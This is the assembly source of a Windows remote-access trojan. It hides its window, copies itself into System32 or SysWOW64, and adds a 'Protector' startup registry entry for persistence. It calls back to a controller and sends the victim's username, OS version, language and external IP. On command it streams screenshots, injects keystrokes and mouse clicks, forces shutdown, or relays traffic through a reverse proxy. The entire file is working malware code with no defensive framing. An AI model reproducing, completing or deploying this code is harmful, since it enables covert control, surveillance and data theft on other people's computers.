.486
.model flat, stdcall
.mmx
.xmm
option casemap: none


includelib C:\masm32\lib\kernel32.lib
includelib C:\masm32\lib\user32.lib
includelib C:\masm32\lib\gdi32.lib
includelib C:\masm32\lib\ws2_32.lib
includelib C:\masm32\lib\gdiplus.lib
includelib C:\masm32\lib\ole32.lib
includelib C:\masm32\lib\comctl32.lib
includelib C:\masm32\lib\version.lib
includelib C:\masm32\lib\advapi32.lib
includelib C:\masm32\lib\msvcrt.lib
includelib C:\masm32\lib\wininet.lib
includelib C:\masm32\lib\psapi.lib
includelib C:\masm32\lib\shlwapi.lib


;
include C:\masm32\include\wininet.inc
include C:\masm32\include\ole32.inc
include C:\masm32\include\kernel32.inc
include C:\masm32\include\version.inc
include C:\masm32\include\windows.inc
include C:\masm32\include\advapi32.inc
include C:\masm32\include\user32.inc
include C:\masm32\include\gdi32.inc

include C:\masm32\include\masm32.inc
include C:\masm32\include\ws2_32.inc
include C:\masm32\include\gdiplus.inc

include C:\masm32\include\comctl32.inc
include C:\masm32\include\msvcrt.inc
include C:\masm32\macros\macros.asm
include C:\masm32\include\psapi.inc
include c:\masm32\include\shlwapi.inc

;include C:\masm32\MasmBasic\MasmBasic.inc
include Resource.inc

 


SETTINGS STRUCT
	port		DD	0
	URL			BYTE 256 dup(?)
	Sys32		DWORD 0
	Startup		DWORD 0
SETTINGS ENDS

WinMain proto :DWORD,:DWORD,:DWORD,:DWORD
Remote proto :DWORD
UnicodeStr	proto :DWORD, :DWORD

SendCursorInfo proto :DWORD
MouseAction	proto :DWORD 
GetSysVer	proto
GetExIP proto :DWORD
KeyAction proto :DWORD
RProxy proto
ConnectToWebServer proto :PTR  BYTE, :DWORD

FN_ISWOW64PROCESS typedef proto stdcall :HANDLE, :PBOOL
LPFN_ISWOW64PROCESS typedef ptr FN_ISWOW64PROCESS

.CONST

sCLSID_PNG textequ <{0557cf401h, 01a04h, 011d3h,\
			{09ah, 073h, 000h, 00h, 0f8h, 01eh, 0f3h, 02eh}}>

.data

 	iheight				dd	0
	iwidth				dd	0
   	wsa					WSADATA <>
   	sa					sockaddr_in <>			
	ImageInfo			ImageCodecInfo		<>
	encoders_count      dd 0
	encoders_size       dd 0
	ImgType             db "image//png",0
	dropspot			db 'C:\Windows\System32\xxmm.exe', 0
	Wow64Drop			db 'C:\Windows\SysWOW64\xxmm.exe', 0
	Protec				db 'Protector', 0
	AdminErr			db 'Please run with Administrator Privileges', 0
	RegPath				db 'Software\Microsoft\Windows\CurrentVersion\Run',0
	;imgpath				db 'test.png',0
	kernel32				db 'kernel32', 0
	Sys32				db 'C:\Windows\System32', 0
	SysWow				db 'C:\Windows\SysWOW64', 0
	IP					db '127.0.0.1',0
	CLSIDImageEncoderPNG GUID sCLSID_PNG
	IsRProx				dd 0
	port				dd 4444
	Knel				db 'kernel32', 0
	wow64				db 'IsWow64Process', 0
	;szData				dd 9052
	;szBytes				dd 15872
	szEBytes			dd 14848
	li					LARGE_INTEGER <>
	ul					LARGE_INTEGER <>
	pstatstg				STATSTG  <>
	istream				dd 0
	mInput				INPUT <>
	mwSS				REAL4	65536.0
	R4					dd	0.0
	data				SETTINGS <0>
	wTitle				db " "
	wCna				db " "

.data?
   	hInstance 			dd ? 
   	CommandLine			dd ?
   	sock				dd ?
	StartupInfo         GdiplusStartupInput <?>	
	token				dd ?
	pPicture			dd ?
	;pImageCodecInfo     dd ?
	clsid				dd ?
	packSize			dd ?
	error				dd ?
	hGlobal				dd ?
	pMemory				dd ?
	iSize				dd ?

	LDOWN				dd ?
	vInfo				dd ?
	
.code


main proc
	LOCAL szSize:DWORD
	LOCAL szThis[MAX_PATH]:BYTE
	;LOCAL szTBack[MAX_PATH]:BYTE
	LOCAL hFile:HANDLE
	;LOCAL ERR:DWORD
	LOCAL pe32:PROCESSENTRY32
	LOCAL hSnapshot:HANDLE
	LOCAL ppid:DWORD
	LOCAL pid:DWORD
	LOCAL fBuf[16141]:BYTE
	;LOCAL comp:DWORD
	LOCAL fhFile:HANDLE
	LOCAL hMod:HMODULE
	LOCAL sui:STARTUPINFO
	LOCAL pi:PROCESS_INFORMATION
	;LOCAL OldValue:DWORD
	LOCAL isWow64:DWORD
	LOCAL hKey:HKEY
	LOCAL Reg:DWORD
	LOCAL rCheck[256]:BYTE
	LOCAL szrSize:DWORD
	LOCAL fnIsWow64Process:LPFN_ISWOW64PROCESS
	LOCAL isDBGpresent:BYTE

	assume fs:nothing
	mov	eax, fs:[30h]
	mov	al, [eax + 2h]
	mov isDBGpresent, al

	cmp isDBGpresent, 1
	jnz	DebuggerIsPresent



	
	
	 	cmp		data.Sys32, 0
		jmp		DoNotMove ;;;;;;;;change from je to jmp if debugging

	GetPID:
	xor eax, eax
		mov pid, eax


		mov pe32.dwSize, sizeof PROCESSENTRY32
		invoke	CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
		mov	hSnapshot, eax
		invoke	Process32First, hSnapshot, addr pe32
		invoke	GetCurrentProcessId
		mov	pid, eax

	FindPID:
	
		mov	eax, pe32.th32ProcessID
		cmp pid, eax
		je Continue

		invoke	Process32Next, hSnapshot, addr pe32

		jmp FindPID

	Continue:
		mov	eax, pe32.th32ParentProcessID
		mov	ppid, eax
		invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE, ppid
		mov	hFile, eax
		invoke EnumProcessModules, hFile, addr hMod, sizeof hMod, addr szSize
		invoke GetModuleFileNameEx, hFile, hMod, addr szThis, sizeof szThis
		cmp Reg, 1
		je	GetFilePath
		invoke	CreateFile, addr szThis, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL

		mov	hFile, eax
	;	invoke SetFilePointer, hFile, szBytes, NULL, FILE_BEGIN
		;NOP
	;	invoke ReadFile, hFile, addr data, 268, addr szSize, NULL

		;printf("Port: %i URL: %s, Checked?: %i\n", data.port, data.URL, data.Sys32 )
		;invoke GetLastError
		;printf("ReadFile Error: %i\nBytes Read:%i\n Sys32?:%i\n", eax, szSize, data.Sys32)


		
		invoke PathRemoveFileSpec, addr szThis
		;;invoke StrLen, addr szThis
		mov	 ebx, sizeof Sys32
		add eax, 1
		cmp	 eax, ebx
		je		DoNotMove
		;printf("%s\n%s\n%i\n%i\n",  addr szThis, addr Sys32, eax, ebx)

		invoke SetFilePointer, hFile, 0, NULL, FILE_BEGIN
		;printf("SetFilePointer\n")
		invoke ReadFile, hFile, addr fBuf, szEBytes, addr szSize, NULL
		;printf("ReadFile")
		invoke CloseHandle,hFile
		;printf("HandleClosed\n")
		invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE, ppid
		;printf("ProcessOpened")
		invoke TerminateProcess,eax, 0
		;invoke GetLastError
		;printf("Terminate Process Error: %i\n", eax)
		invoke GetModuleHandle, addr Knel
		invoke GetProcAddress, eax, addr wow64
		cmp eax, 1
		jb	ntWow
		mov fnIsWow64Process,eax 
		invoke GetCurrentProcess
		mov		ebx, eax
		invoke fnIsWow64Process, ebx, addr isWow64
		cmp eax, 1
		jb  ntWow
		invoke IsWow64Process, ebx, addr isWow64
		;printf("IsWow64: ", isWow64)
		cmp		isWow64, 1
		je		IsWow
	ntWow:
		mov	esi, OFFSET dropspot
		jmp ContWow
	IsWow:
		mov esi, OFFSET Wow64Drop
		
	ContWow:

		invoke CreateFile, esi, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
		mov fhFile, eax
		invoke GetLastError
		cmp	eax, 5
		je AdminRights
		
		invoke WriteFile, fhFile, addr fBuf,szEBytes, addr szSize, NULL
		
		;printf("WriteFile Error: %i", eax)
		invoke CloseHandle, fhFile
	invoke CreateProcess,NULL, esi, NULL, NULL, FALSE, NULL, NULL, NULL, addr sui,addr pi


		;invoke Sleep, 1000000

		invoke ExitProcess, 0



		


		DoNotMove:

		cmp data.Startup, 0
		je	NoStartup
		invoke	RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr RegPath, 0, KEY_READ,addr  hKey
		mov	szrSize, 256
		invoke	RegQueryValueEx, hKey, chr$("Protector"), 0, 0,addr rCheck ,addr szrSize
		cmp	eax, 0
		je	NoStartup
		invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr RegPath, 0, KEY_ALL_ACCESS , addr hKey
		cmp eax, 0
		jnz	AdminRights
		mov Reg, 1
		jmp GetPID
	GetFilePath:
	;printf("%s", addr szThis)
;;	invoke StrLen, addr szThis
		INVOKE RegSetValueEx, hKey, addr Protec, 0, REG_SZ, addr szThis, eax
		cmp eax, 0
		jnz	AdminRights
		cmp eax, 0
		jnz	AdminRights




	NoStartup:
	;	invoke	GetModuleFileName, NULL, addr szThis, MAX_PATH
	;printf("File Name: %s\n", addr szThis) 
	


		;invoke	CreateFile, addr szThis, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
		;mov		hFile, eax
		;invoke SetFilePointer, hFile, szData, NULL, FILE_BEGIN
		;NOP
		;invoke ReadFile, hFile, addr data, 268, addr szSize, NULL
		;invoke CloseHandle,hFile
		;printf("Port: %i URL: %s, Checked?: %i\n", data.port, data.URL, data.Sys32 )
		;invoke Sleep, 1000000
	xor eax,eax
	invoke WSAStartup, 0202h, addr wsa
	.if eax!=NULL
		invoke ExitProcess, eax 
	.else
		invoke GetModuleHandle, NULL
		mov    hInstance,eax
		invoke GetCommandLine
		mov    CommandLine,eax
		invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT
		invoke ExitProcess,eax
	.endif
	DebuggerIsPresent:
	AdminRights:
	invoke MessageBox, NULL, OFFSET AdminErr, NULL, NULL

	invoke ExitProcess, 0
	ret
main endp

WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD
	LOCAL wc:WNDCLASSEX
	LOCAL msg:MSG
	LOCAL hwnd:HWND
 
	mov   wc.cbSize,SIZEOF WNDCLASSEX
	mov   wc.style, CS_HREDRAW or CS_VREDRAW
	mov   wc.lpfnWndProc, OFFSET WndProc
	mov   wc.cbClsExtra,NULL
	mov   wc.cbWndExtra,NULL
	push  hInstance
	pop   wc.hInstance
	mov   wc.hbrBackground,COLOR_BTNFACE+1
	mov   wc.lpszMenuName,NULL
	mov   wc.lpszClassName,OFFSET wCna
 
	invoke LoadIcon,NULL,IDI_APPLICATION
	mov   wc.hIcon,eax
	mov   wc.hIconSm,eax
 
	invoke LoadCursor,NULL,IDC_ARROW
	mov   wc.hCursor,eax
 
	invoke RegisterClassEx, addr wc
	INVOKE CreateWindowEx,NULL,addr wCna, addr wTitle,\
          WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\
          CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\
          hInst,NULL
	mov   hwnd,eax
 
	;invoke ShowWindow, hwnd,SW_SHOWNORMAL;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;invoke UpdateWindow, hwnd
 
	.WHILE TRUE
		invoke GetMessage, ADDR msg,NULL,0,0
		.BREAK .IF (!eax)
		invoke TranslateMessage, ADDR msg
		invoke DispatchMessage, ADDR msg
	.ENDW
 
	mov     eax,msg.wParam
	ret
WinMain endp
 
WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
LOCAL packet:DWORD
LOCAL Zero:DWORD
LOCAL hToken:HANDLE

LOCAL tkp:TOKEN_PRIVILEGES
	.IF uMsg==WM_DESTROY
		invoke PostQuitMessage,NULL
	.ELSEIF uMsg==WM_CREATE
		;invoke Remote
		invoke SendMessage, hWnd, WM_CONNECT, 100, 0 
		
	.elseif uMsg == WM_CONNECT
		.if wParam == 100 
			invoke socket, AF_INET,SOCK_STREAM, 0
			.if eax==INVALID_SOCKET
				;error
			.endif
			mov sock, eax
			mov sa.sin_family, AF_INET
			;;invoke inet_addr,addr data.URL
			invoke inet_addr,addr IP
			mov sa.sin_addr, eax
			;;invoke htons, data.port
			invoke htons, port
			mov sa.sin_port, ax
			mov eax, SOCKET_ERROR
			;invoke	GetSysVer
		retry:
			.while eax == SOCKET_ERROR
				invoke connect, sock, addr sa, sizeof sa
				
			.endw
			mov		Zero, 0
			invoke send, sock, addr Zero, 4, 0
			invoke	GetSysVer
			.while eax != INVALID_SOCKET
				
				
				
				mov packet, NULL
			

				invoke recv, sock, addr packet, 4, 0
				cmp eax, 0
				je retry
				.if packet == -1
					invoke ExitProcess, 0

				.endif
				.if packet == 2
					invoke CreateThread, NULL, NULL, Remote, NULL, NULL, NULL
					;invoke	Remote
					;cmp		eax, 0
					;jne		retry
				.endif
				.if packet == 5
					invoke Remote, 5
				.endif
				.if packet == 6
					invoke GetCurrentProcess
					mov ebx, eax
					assume esi:ptr TOKEN_PRIVLEGES
					invoke OpenProcessToken, ebx, TOKEN_ADJUST_PRIVILEGES OR TOKEN_QUERY, addr hToken
					invoke LookupPrivilegeValue, 0,  chr$("SeShutdownPrivilege"), addr tkp.Privileges.Luid
					mov	tkp.PrivilegeCount, 1
					;mov tkp.Privileges.LUID.LowPart, sdnv.LowPart
					;mov	tkp.Privileges.LUID.HighPart, sdnv.HighPart
					mov	tkp.Privileges.Attributes, SE_PRIVILEGE_ENABLED

					invoke AdjustTokenPrivileges, hToken, FALSE, addr tkp, 0, NULL, 0

					invoke ExitWindowsEx,EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_SYSTEM
				.endif
				.if packet == 7
					invoke CreateThread, NULL, NULL, RProxy, NULL, NULL, NULL
					

				.endif
			.endw
			INVOKE SendMessage, hWnd, WM_CONNECT, 100, 0
			
		.endif
	.ELSE
		invoke DefWindowProc,hWnd,uMsg,wParam,lParam		
		ret
	.ENDIF
 
	xor eax,eax
	ret
WndProc endp
 
RProxy proc
	LOCAL rpSock :DWORD
	LOCAL webSock :DWORD
	LOCAL irps :DWORD
	LOCAL tv:timeval
	LOCAL hHeap:HANDLE
	LOCAL wFds:fd_set
	LOCAL Rport :DWORD
	LOCAL ioul :DWORD
	LOCAL Bsize :DWORD
	LOCAL bytes_avail :DWORD

	xor eax, eax
	mov Rport, eax

	invoke GetProcessHeap
	mov hHeap, eax
	
	invoke	socket, AF_INET, SOCK_STREAM, 0
	mov		rpSock, eax
	invoke connect, rpSock, addr sa, sizeof sa

	mov irps, 7
	
	invoke send, rpSock, addr irps, 4, 0
	
	mov ioul, 1
	invoke ioctlsocket, webSock, FIONBIO, addr ioul 



	mov tv.tv_sec, 10
	mov tv.tv_usec, 0
	mov [wFds.fd_set.fd_count], 0
	mov eax, rpSock
	mov [wFds.fd_set.fd_array[0]], eax
	mov [wFds.fd_set.fd_count], 1
	
	invoke select, 0, addr wFds, NULL, NULL, addr tv
	.if eax > 0
		invoke recv, rpSock, addr Bsize, 4, 0
		INVOKE HeapAlloc, hHeap, HEAP_ZERO_MEMORY, Bsize
		mov esi, eax
		invoke recv, rpSock, esi, Bsize, 0
		invoke WSAGetLastError
		invoke recv, rpSock, addr Rport, 4, 0
		invoke WSAGetLastError
	.else
		jmp err
	.endif
	
	.if Rport > 443
		jmp err
	.endif
	.if Rport < 80
		jmp err
	.endif

	invoke ConnectToWebServer, esi, Rport
	cmp eax, 0
	jz err

	mov webSock, eax
	
	invoke HeapFree, hHeap, 0, esi
	


	.if Rport == 443
		mov ioul, 200
		invoke send, rpSock, addr ioul, 4, 0
		.if eax < 1          
			invoke WSAGetLastError   
			jmp err
		.endif
	.endif

;	.if eax < 1          
;		invoke WSAGetLastError   
;		jmp err
;	.endif


	xor ebx, ebx
	

	SelSend:
		mov tv.tv_sec, 2
		mov tv.tv_usec, 0
		mov [wFds.fd_set.fd_count], 0
		mov eax, rpSock
		mov [wFds.fd_set.fd_array[0]], eax
		mov eax, webSock
		mov [wFds.fd_set.fd_count], 1
		mov [wFds.fd_set.fd_array[4]], eax
		

		mov [wFds.fd_set.fd_count], 2



		invoke select, 0, addr wFds, NULL, NULL, addr tv
		;invoke WSAGetLastError
		
		.if eax != SOCKET_ERROR
			cmp ebx, 5
			ja err
		.if eax > 0		
;			.if esi
;				cld
;				lea edi, esi
;				mov ecx, (SIZEOF esi)
;				mov al, 0
;				rep stosb
			;.endif
			invoke __WSAFDIsSet, rpSock, addr wFds
			.if eax 
				invoke ioctlsocket, rpSock, FIONREAD, addr bytes_avail
				.if bytes_avail
					INVOKE HeapAlloc, hHeap, HEAP_ZERO_MEMORY, bytes_avail
					mov esi, eax
					;pop eax
					invoke recv, rpSock, esi, bytes_avail, 0
					.if eax != bytes_avail
						jmp err
					.endif
					.if eax == SOCKET_ERROR
						jmp err
					.endif 
					.if eax != 0
						invoke send, webSock, esi, eax, 0
					.endif
					.if eax != bytes_avail
						jmp err
					.endif
					Invoke HeapFree, hHeap, 0, esi
				.endif
			.endif
			invoke __WSAFDIsSet, webSock, addr wFds
			.if eax
				invoke ioctlsocket, webSock, FIONREAD, addr bytes_avail
				.if bytes_avail
					INVOKE HeapAlloc, hHeap, HEAP_ZERO_MEMORY, bytes_avail
					mov esi, eax
					;pop eax
					invoke recv, webSock, esi, bytes_avail, 0
					.if eax != bytes_avail
						jmp err
					.endif
					.if eax == SOCKET_ERROR
						jmp err
					.endif
					invoke send, rpSock, esi, bytes_avail, 0
					.if eax != bytes_avail
						jmp err
					.endif
					Invoke HeapFree, hHeap, 0, esi
					
				.else 
					add ebx, 1
				.endif

			.endif
		.else 
			add ebx, 1
		.endif
		.endif
		jmp SelSend








	err:
	ret

 RProxy endp

 ConnectToWebServer proc address:PTR BYTE, Rport:DWORD
	LOCAL sver :sockaddr_in
	LOCAL hp :PTR hostent
	LOCAL wSock :DWORD
	;;assume eax:PTR hostent
	;;assume ecx: PTR sockaddr_in
	
	
	
	invoke htons, Rport
	mov sver.sin_port, ax
	invoke gethostbyname, address
	;invoke WSAGetLastError
	mov eax, [eax+12]
	mov eax, [eax]
	mov eax, [eax]
	mov sver.sin_addr, eax
	mov sver.sin_family, AF_INET
	
	invoke	socket, AF_INET, SOCK_STREAM, 0
	mov		wSock, eax

	invoke connect, wSock, addr sver, 16

	.if eax==SOCKET_ERROR           
             invoke WSAGetLastError    
	.endif

	mov eax, wSock

	ret 0
 ConnectToWebServer endp

 Remote proc Screeny:DWORD
	LOCAL sSend:DWORD
	LOCAL tO:timeval
	LOCAL rdFds:fd_set
	LOCAL erFds:fd_set
	LOCAL packet:DWORD
	LOCAL rSock:DWORD
	LOCAL rMote:DWORD
	;LOCAL encoderClsid:GUID

		mov		rMote, 2
		.IF Screeny == 5
			mov	rMote, 5
		.endif
		invoke socket, AF_INET,SOCK_STREAM, 0
		mov		rSock, eax
		invoke connect, rSock, addr sa, sizeof sa
		
		invoke send, rSock, addr rMote, 4, 0
		
		mov		eax, OFFSET StartupInfo
		mov		GdiplusStartupInput.GdiplusVersion[eax], 1
		invoke	GdiplusStartup,  addr token, addr StartupInfo, NULL
		cmp		eax, eax
		jnz		fail
		
		;invoke  GetEncoderClsid,ADDR ImgType,ADDR clsid
		;mov		clsid, eax
		;invoke	GUIDFromString, addr guid, addr clsid
		invoke	GetDC, HWND_DESKTOP
		test	eax, eax
		jz		Fgdiplus_shutdown
		mov		esi, eax

		invoke	GetSystemMetrics, SM_CYSCREEN
		mov		[iheight], eax
		invoke	GetSystemMetrics, SM_CXSCREEN
		mov		[iwidth], eax


		cmp Screeny, 5
		je SCREENY
	.WHILE TRUE
SCREENY:
	xor		ebx,ebx
	dec		ebx
	Recheck:
		mov		tO.tv_sec, 0
		mov		tO.tv_usec, 500000

		mov		[erFds.fd_set.fd_count], 0
		mov		eax, rSock
		mov		[erFds.fd_set.fd_array[0]], eax
		mov		[erFds.fd_set.fd_count], 1

		mov		[rdFds.fd_set.fd_array[0]], eax

		mov		eax, [erFds.fd_set.fd_count]
		mov		[rdFds.fd_set.fd_count], eax

		
	
		inc		ebx
		cmp		ebx, 3
		ja		Fgdiplus_shutdown
		invoke  select,  0, addr rdFds, NULL, addr erFds, addr tO
		cmp		eax, 1
		
		jb		Recheck

		invoke	recv, rSock, addr sSend, 4, 0


	grab_screen:

		invoke	CreateCompatibleBitmap,	esi, [iwidth], [iheight]
		test	eax,eax
		jz		Frelease_desktop_dc
		mov		ebx, eax
		invoke	CreateCompatibleDC, esi
		test	eax, eax
		jz		Fdelete_bitmap
		mov		edi, eax
		invoke	SelectObject, edi, ebx
		test	eax, eax
		jz		Fdelete_dc
		invoke	BitBlt, edi, 0, 0, [iwidth], [iheight], esi, 0, 0, SRCCOPY
		test	eax, eax
		jz		Fdelete_dc
		invoke	GdipCreateBitmapFromHBITMAP, ebx,NULL, addr pPicture
		test	eax, eax
		jnz		Fdelete_dc
		invoke	CreateStreamOnHGlobal, NULL, TRUE, addr istream
		



		invoke  GetHGlobalFromStream,istream ,ADDR hGlobal
		;invoke memcopy,offset GUID_ImageEncoderPNG, addr  encoderClsid,SIZEOF GUID

	;	invoke GdipSaveImageToFile, [pPicture], addr imgpath, offset CLSIDImageEncoderPNG, NULL
		invoke	GdipSaveImageToStream,  [pPicture],  istream, offset CLSIDImageEncoderPNG, 0
		invoke	GlobalLock, hGlobal
		mov		pMemory, eax


		mov		dword ptr[li], 0						;BEAUTIFUL 
		mov		dword ptr[ul], 0						;=========
		mov		edx, OFFSET li							; UL CONTAINS LOW PART
		mov		eax, istream							;================
		push	OFFSET ul
		push	STREAM_SEEK_END
		push	dword ptr [edx+4]
		push	dword ptr [edx]
		push	eax
		mov		eax, dword ptr [eax]
		call	IStream.Seek[eax]

		mov		eax, OFFSET ul
		mov		eax, DWORD PTR[eax]
		mov		iSize, eax
		
		invoke	send, rSock, addr ul, 4 , 0
		cmp	eax, INVALID_SOCKET
		je	Fdelete_dc
		invoke	send, rSock, pMemory , iSize , 0
		cmp eax, INVALID_SOCKET
		je	Fdelete_dc

		invoke	GdipDisposeImage, [pPicture]
		invoke	GlobalFree, pMemory



	delete_dc:
		invoke  DeleteObject, edi
	delete_bitmap:
		invoke  DeleteObject, ebx
	
		invoke	SendCursorInfo, rSock
		cmp		eax, 0
		jb		Fdelete_dc
	cmp Screeny, 5
	jz SCREENSHOT
	CheckPacket:
		invoke recv, rSock, addr packet, 4, 0
		cmp packet, 0
		je NoAction

	
	KeyA:
		invoke KeyAction, rSock
		
	MouseA:
		invoke	MouseAction, rSock

	NoAction:

		invoke Sleep, 75

	.ENDW

	SCREENSHOT:

	release_desktop_dc:
		invoke  ReleaseDC, HWND_DESKTOP, esi
	gdiplus_shutdown:
		invoke  GdiplusShutdown, [token]
		mov eax, 1
		ret
  	
	
	Fdelete_dc:
		invoke	GlobalFree, pMemory
		invoke  DeleteObject, edi

	Fdelete_bitmap:
		invoke  DeleteObject, ebx
	Frelease_desktop_dc:
		invoke  ReleaseDC, HWND_DESKTOP, esi
	Fgdiplus_shutdown:
		invoke  GdiplusShutdown, [token]

	fail:
		xor eax, eax
		ret 


 Remote endp

 SendCursorInfo PROC rSock:DWORD
 LOCAL ps:POINT
 LOCAL cInfo:CURSORINFO

		invoke	GetCursorPos, addr ps
		invoke	send, rSock, addr ps, sizeof ps, 0
		mov		cInfo.cbSize, sizeof CURSORINFO
		invoke	GetCursorInfo, addr cInfo
		invoke	send, rSock, addr cInfo, sizeof CURSORINFO, 0
		cmp		eax, 0
		jb		return1
		ret		0
	return1:
		ret		1
 SendCursorInfo endp

 KeyAction PROC rSock:DWORD
	LOCAL KEY:WORD
	LOCAL kInput:INPUT

		mov		kInput._type, INPUT_KEYBOARD
		mov		kInput.ki.time, 0
		mov		kInput.ki.dwFlags, KEYEVENTF_SCANCODE
		invoke	recv, rSock, addr KEY, 2, 0
		cmp KEY, 0
		jz	return0
		mov		kInput.ki.wVk, 0
		invoke	MapVirtualKey, KEY, MAPVK_VK_TO_VSC
		mov		kInput.ki.wScan, ax
		invoke	SendInput, 1, addr kInput, sizeof INPUT
		mov		kInput.ki.dwFlags, KEYEVENTF_SCANCODE or KEYEVENTF_KEYUP
		invoke	SendInput, 1, addr kInput, sizeof INPUT




		return0:
		ret
 KeyAction endp
 MouseAction PROC rSock:DWORD
	LOCAL MDOWN:DWORD
	LOCAL pr:POINT
		;invoke RtlZeroMemory,addr inputx,sizeof INPUT
		mov		mInput._type, INPUT_MOUSE
		mov		mInput.mi.time, 0
		mov		mInput.mi.dwFlags, MOUSEEVENTF_ABSOLUTE or MOUSEEVENTF_MOVE
		invoke	recv, rSock, addr pr, sizeof pr, 0
		invoke	recv, rSock, addr MDOWN, 4, 0
		cmp		pr.x, 0
		je		return0
		invoke	GetSystemMetrics, SM_CXSCREEN
		cvtsi2ss	xmm0, eax
		movss	xmm1, dword ptr [mwSS]
		divss		xmm1, xmm0
		cvtsi2ss	xmm0, pr.x
		mulss		xmm0, xmm1
		cvttss2si	eax, xmm0
		mov		mInput.mi._dx, eax
		invoke	GetSystemMetrics, SM_CYSCREEN
		cvtsi2ss	xmm0, eax
		movss	xmm1, dword ptr [mwSS]
		divss		xmm1, xmm0
		cvtsi2ss	xmm0, pr.y
		mulss		xmm0, xmm1
		cvttss2si	eax, xmm0
		mov		mInput.mi.dy, eax
		invoke	SendInput, 1, addr mInput, 28

		cmp		MDOWN, 0
		je		return0
		cmp		MDOWN, 1
		je		LEFTDOWN
		cmp		MDOWN, 2
		je		LEFTUP
		cmp		MDOWN, 3
		je		RIGHTDOWN
		cmp		MDOWN, 4
		je		RIGHTUP
	RIGHTDOWN:
		mov		mInput.mi.dwFlags, MOUSEEVENTF_RIGHTDOWN
		invoke	SendInput, 1, addr mInput, sizeof INPUT
		;invoke	GetLastError
		jmp		return0
	RIGHTUP:
		mov		mInput.mi.dwFlags, MOUSEEVENTF_RIGHTUP
		invoke	SendInput, 1, addr mInput, sizeof INPUT
		;invoke	GetLastError
		jmp		return0
	LEFTDOWN:
		mov		mInput.mi.dwFlags, MOUSEEVENTF_LEFTDOWN
		invoke	SendInput, 1, addr mInput, sizeof INPUT
		;invoke	GetLastError
		jmp		return0
	LEFTUP:
		mov		mInput.mi.dwFlags, MOUSEEVENTF_LEFTUP
		invoke	SendInput, 1, addr mInput,	sizeof INPUT
	return0:
		ret	0
 MouseAction endp
 GetSysVer PROC 
	LOCAL hKey:DWORD
	LOCAL buffer[50]:BYTE
	LOCAL szsize:DWORD
	LOCAL LANGIDs:DWORD

		mov		szsize, 50
		invoke	GetUserName, addr buffer, addr szsize

		invoke	send, sock, addr szsize, sizeof szsize, 0
		invoke	send, sock, addr buffer, szsize, 0
		invoke	GetExIP, addr buffer


		mov		szsize, sizeof buffer
		invoke	RegOpenKeyEx, HKEY_LOCAL_MACHINE, chr$("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_READ,addr  hKey
		invoke	RegQueryValueEx, hKey, chr$("ProductName"), 0, 0,addr  buffer,addr szsize
		;printf("%s", addr buffer)

		invoke	send, sock, addr szsize, sizeof szsize, 0



		invoke	send, sock, addr buffer, szsize, 0
		invoke	GetSystemDefaultUILanguage
		mov		LANGIDs, eax
		invoke	send, sock, addr LANGIDs, 4, 0
		;invoke	Sleep, 5000000

	ret
 GetSysVer ENDP

 GetExIP PROC pName:DWORD 
	LOCAL buffer[200]:BYTE
	LOCAL read:DWORD
	LOCAL net:DWORD
	LOCAL conn:DWORD
		mov		buffer, 0
		invoke	InternetOpen, pName, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
		mov		net, eax
		invoke	InternetOpenUrl,net,  chr$("http://api.ipify.org"), NULL, 0, INTERNET_FLAG_RELOAD,0
		;invoke	GetLastError
		;printf("%i\n", eax)
		mov		conn, eax
		invoke	InternetReadFile,conn, addr buffer, sizeof buffer, addr read
		;printf("%s\n%s\n", addr buffer, pName)

		invoke	send, sock, addr read, sizeof read, 0
		cmp read, 256
		ja tooLarge
		invoke	send, sock, addr buffer, read, 0
	tooLarge:
		ret


 GetExIP ENDP

 

end main

